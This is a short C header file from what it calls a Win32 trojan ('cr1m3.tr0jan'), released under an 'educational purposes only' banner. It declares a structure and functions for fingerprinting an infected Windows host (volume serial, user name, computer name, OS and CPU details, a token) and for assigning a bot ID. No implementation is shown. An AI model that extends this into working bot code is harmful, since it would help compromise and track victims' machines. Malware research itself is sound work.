/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#ifndef __INFO_H_FILE
#define __INFO_H_FILE


struct info_struct {
	unsigned char *volume_serial;
	unsigned char *user_name;
	unsigned char *computer_name;
	unsigned char *os_version;
	unsigned char *cpuinfo;
	unsigned char botid[32];
};

typedef struct info_struct info;



//public
int __get_info(info *s_info);
char *__get_botid(void);
int __set_botid(void);

//private
int __get_volume_serial(info *s_info);
int __get_user_name(info *s_info);
int __get_computer_name(info *s_info);
int __get_windows_version(info *s_info);
int __get_cpuid(info *s_info);
int __get_token(info *s_info);

#endif __INFO_H_FILE
